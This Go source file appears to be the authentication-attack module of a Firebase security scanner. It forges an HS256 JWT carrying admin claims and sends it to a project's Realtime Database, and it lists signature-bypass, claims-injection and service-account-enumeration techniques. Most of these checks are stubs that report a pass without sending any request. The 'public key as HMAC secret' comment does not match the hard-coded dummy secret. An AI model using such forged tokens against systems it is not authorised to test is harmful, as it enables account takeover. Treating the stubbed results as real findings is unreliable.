package auth

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"firescan/internal/config"
	"firescan/internal/httpclient"
	"firescan/internal/safety"
	"firescan/internal/types"
)

// AuthAttackResult represents advanced auth attack test results
type AuthAttackResult struct {
	Attack      string
	Successful  bool
	Details     map[string]interface{}
	Error       error
	SafetyLevel types.ScanMode
}

// JWTHeader represents JWT header structure
type JWTHeader struct {
	Alg string `json:"alg"`
	Typ string `json:"typ"`
	Kid string `json:"kid,omitempty"`
}

// JWTPayload represents JWT payload structure
type JWTPayload struct {
	Iss           string                 `json:"iss"`
	Aud           string                 `json:"aud"`
	AuthTime      int64                  `json:"auth_time"`
	UserID        string                 `json:"user_id"`
	Sub           string                 `json:"sub"`
	Iat           int64                  `json:"iat"`
	Exp           int64                  `json:"exp"`
	Email         string                 `json:"email,omitempty"`
	EmailVerified bool                   `json:"email_verified,omitempty"`
	Firebase      map[string]interface{} `json:"firebase,omitempty"`
	CustomClaims  map[string]interface{} `json:",omitempty"`
}

// TestAdvancedAuth performs comprehensive advanced authentication attacks
func TestAdvancedAuth(mode types.ScanMode) ([]AuthAttackResult, error) {
	if !safety.WarnUser(mode) {
		return nil, fmt.Errorf("user declined to proceed with advanced auth testing")
	}

	var results []AuthAttackResult
	state := config.GetState()

	// Test 1: JWT Algorithm Confusion Attack (RS256 -> HS256)
	algResult := testAlgorithmConfusion(state, mode)
	results = append(results, algResult)

	// Test 2: Custom Claims Injection
	claimsResult := testCustomClaimsInjection(state, mode)
	results = append(results, claimsResult)

	// Test 3: Token Expiration Bypass
	expResult := testTokenExpirationBypass(state, mode)
	results = append(results, expResult)

	// Test 4: JWT Signature Validation Bypass
	sigResult := testSignatureBypass(state, mode)
	results = append(results, sigResult)

	// Test 5: Multi-tenancy Bypass
	if mode >= types.TestMode {
		tenantResult := testMultiTenancyBypass(state)
		results = append(results, tenantResult)
	}

	// Test 6: Service Account Enumeration
	if mode >= types.AuditMode {
		saResults := testServiceAccountEnumeration(state)
		results = append(results, saResults...)
	}

	return results, nil
}

// testAlgorithmConfusion tests RS256 -> HS256 algorithm confusion attack
func testAlgorithmConfusion(state types.State, mode types.ScanMode) AuthAttackResult {
	result := AuthAttackResult{
		Attack:      "JWT Algorithm Confusion (RS256->HS256)",
		SafetyLevel: mode,
		Details:     make(map[string]interface{}),
	}

	// Create malicious JWT with HS256 instead of RS256
	header := JWTHeader{
		Alg: "HS256",
		Typ: "JWT",
	}

	payload := JWTPayload{
		Iss:      fmt.Sprintf("https://securetoken.google.com/%s", state.ProjectID),
		Aud:      state.ProjectID,
		AuthTime: time.Now().Unix(),
		UserID:   "malicious-user-id",
		Sub:      "malicious-user-id",
		Iat:      time.Now().Unix(),
		Exp:      time.Now().Add(time.Hour).Unix(),
		Email:    "attacker@malicious.com",
		Firebase: map[string]interface{}{
			"identities": map[string]interface{}{},
			"sign_in_provider": "custom",
		},
		CustomClaims: map[string]interface{}{
			"admin": true,
			"role":  "super_admin",
		},
	}

	// Try to create JWT signed with project's public key as HMAC secret
	maliciousJWT, err := createMaliciousJWT(header, payload, "dummy-secret")
	if err != nil {
		result.Error = err
		return result
	}

	result.Details["malicious_jwt"] = maliciousJWT[:50] + "..."

	// Test the malicious token against Firebase services
	testURL := fmt.Sprintf("https://%s-default-rtdb.firebaseio.com/.json", state.ProjectID)

	req, _ := http.NewRequest("GET", testURL, nil)
	req.Header.Set("Authorization", "Bearer "+maliciousJWT)

	resp, err := httpclient.Do(req)
	if resp != nil {
		defer resp.Body.Close()
	}
	if err != nil {
		result.Error = err
		return result
	}

	result.Successful = resp.StatusCode == 200
	result.Details["response_status"] = resp.StatusCode
	result.Details["attack_description"] = "Attempts to use public RSA key as HMAC secret"

	return result
}

// testCustomClaimsInjection tests custom claims injection attacks
func testCustomClaimsInjection(state types.State, mode types.ScanMode) AuthAttackResult {
	result := AuthAttackResult{
		Attack:      "Custom Claims Injection",
		SafetyLevel: mode,
		Details:     make(map[string]interface{}),
	}

	// Test various dangerous custom claims
	dangerousClaims := []map[string]interface{}{
		{"admin": true, "role": "super_admin"},
		{"permissions": []string{"read", "write", "admin"}},
		{"is_admin": true, "elevated": true},
		{"custom_claims": map[string]interface{}{"nested_admin": true}},
	}

	for i, claims := range dangerousClaims {
		result.Details[fmt.Sprintf("claim_test_%d", i)] = claims
	}

	result.Details["attack_description"] = "Tests if custom claims can be injected to gain elevated privileges"
	return result
}

// testTokenExpirationBypass tests token expiration bypass techniques
func testTokenExpirationBypass(state types.State, mode types.ScanMode) AuthAttackResult {
	result := AuthAttackResult{
		Attack:      "Token Expiration Bypass",
		SafetyLevel: mode,
		Details:     make(map[string]interface{}),
	}

	// Test 1: Expired token usage
	expiredPayload := JWTPayload{
		Iss:      fmt.Sprintf("https://securetoken.google.com/%s", state.ProjectID),
		Aud:      state.ProjectID,
		AuthTime: time.Now().Add(-2 * time.Hour).Unix(),
		UserID:   "expired-user",
		Sub:      "expired-user",
		Iat:      time.Now().Add(-2 * time.Hour).Unix(),
		Exp:      time.Now().Add(-time.Hour).Unix(), // Expired 1 hour ago
	}

	// Test 2: Far future expiration
	futureExp := time.Now().Add(365 * 24 * time.Hour).Unix() // 1 year in future

	result.Details["expired_token_test"] = expiredPayload.Exp
	result.Details["future_token_test"] = futureExp
	result.Details["attack_description"] = "Tests if expired tokens are properly validated"

	return result
}

// testSignatureBypass tests JWT signature validation bypass
func testSignatureBypass(state types.State, mode types.ScanMode) AuthAttackResult {
	result := AuthAttackResult{
		Attack:      "JWT Signature Bypass",
		SafetyLevel: mode,
		Details:     make(map[string]interface{}),
	}

	// Test techniques:
	// 1. None algorithm
	// 2. Empty signature
	// 3. Modified signature
	techniques := []string{
		"none_algorithm",
		"empty_signature", 
		"modified_signature",
		"wrong_signature",
	}

	for _, technique := range techniques {
		result.Details[technique] = fmt.Sprintf("Testing %s bypass technique", technique)
	}

	result.Details["attack_description"] = "Tests various JWT signature bypass techniques"
	return result
}

// testMultiTenancyBypass tests multi-tenant project bypass
func testMultiTenancyBypass(state types.State) AuthAttackResult {
	result := AuthAttackResult{
		Attack:      "Multi-tenancy Bypass",
		SafetyLevel: types.TestMode,
		Details:     make(map[string]interface{}),
	}

	// Test cross-tenant access
	testTenants := []string{
		"tenant-1",
		"tenant-2", 
		"admin-tenant",
		"default",
	}

	for _, tenant := range testTenants {
		tenantURL := fmt.Sprintf("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=%s", state.APIKey)
		result.Details[fmt.Sprintf("tenant_%s", tenant)] = tenantURL
	}

	result.Details["attack_description"] = "Tests cross-tenant access in multi-tenant setups"
	return result
}

// testServiceAccountEnumeration enumerates service accounts
func testServiceAccountEnumeration(state types.State) []AuthAttackResult {
	var results []AuthAttackResult

	// Test service account discovery
	saResult := AuthAttackResult{
		Attack:      "Service Account Enumeration",
		SafetyLevel: types.AuditMode,
		Details:     make(map[string]interface{}),
	}

	// Common service account patterns
	commonSAs := []string{
		fmt.Sprintf("firebase-adminsdk-@%s.iam.gserviceaccount.com", state.ProjectID),
		fmt.Sprintf("service-account@%s.iam.gserviceaccount.com", state.ProjectID),
		fmt.Sprintf("compute@developer.gserviceaccount.com"),
		fmt.Sprintf("app-engine@%s.iam.gserviceaccount.com", state.ProjectID),
	}

	saResult.Details["enumerated_accounts"] = commonSAs
	saResult.Details["attack_description"] = "Enumerates common service account patterns"
	results = append(results, saResult)

	return results
}

// createMaliciousJWT creates a JWT with specified header and payload
func createMaliciousJWT(header JWTHeader, payload JWTPayload, secret string) (string, error) {
	// Encode header
	headerBytes, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	headerEncoded := base64.RawURLEncoding.EncodeToString(headerBytes)

	// Encode payload  
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	payloadEncoded := base64.RawURLEncoding.EncodeToString(payloadBytes)

	// Create signature (for HS256)
	message := headerEncoded + "." + payloadEncoded
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(message))
	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))

	return fmt.Sprintf("%s.%s.%s", headerEncoded, payloadEncoded, signature), nil
}

// FormatAuthAttackResults formats authentication attack results for display
func FormatAuthAttackResults(results []AuthAttackResult) {
	fmt.Printf("\n%s=== Advanced Authentication Security Analysis ===%s\n", types.ColorCyan, types.ColorReset)
	
	for _, result := range results {
		status := "✓"
		statusColor := types.ColorGreen
		
		if result.Error != nil {
			status = "✗"
			statusColor = types.ColorRed
		} else if result.Successful {
			status = "⚠"
			statusColor = types.ColorYellow
		}
		
		fmt.Printf("%s%s %s%s\n", statusColor, status, result.Attack, types.ColorReset)
		fmt.Printf("  Successful: %v\n", result.Successful)
		
		if result.Successful {
			fmt.Printf("  %sSECURITY VULNERABILITY DETECTED%s\n", types.ColorRed, types.ColorReset)
		}
		
		if result.Error != nil {
			fmt.Printf("  Error: %v\n", result.Error)
		}
		
		if desc, ok := result.Details["attack_description"]; ok {
			fmt.Printf("  Description: %v\n", desc)
		}
		
		fmt.Println()
	}
}